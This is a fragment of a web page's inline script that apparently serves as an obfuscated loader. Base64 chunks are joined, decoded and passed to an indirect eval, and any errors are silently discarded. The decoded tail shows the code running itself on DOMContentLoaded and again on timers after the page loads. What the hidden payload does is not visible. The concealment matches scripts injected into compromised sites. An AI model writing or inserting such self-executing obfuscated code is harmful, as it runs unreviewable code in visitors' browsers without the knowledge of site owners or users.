Jsb2FkaW5nIil7ZG9j","dW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsc3RhcnQpO31lbHNle3N0YXJ0KCk7fXdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJs","b2FkIixmdW5jdGlvbigpe3NldFRpbWVvdXQoZW5zdXJlLDUwMCk7c2V0VGltZW91dChlbnN1cmUsMjAwMCk7fSk7fSkoKTs="].join('');var _nyknut=decodeURIComponent(escape(atob(_mpaidj)));try{(0,eval)(_nyknut);}catch(e){}})();</script>
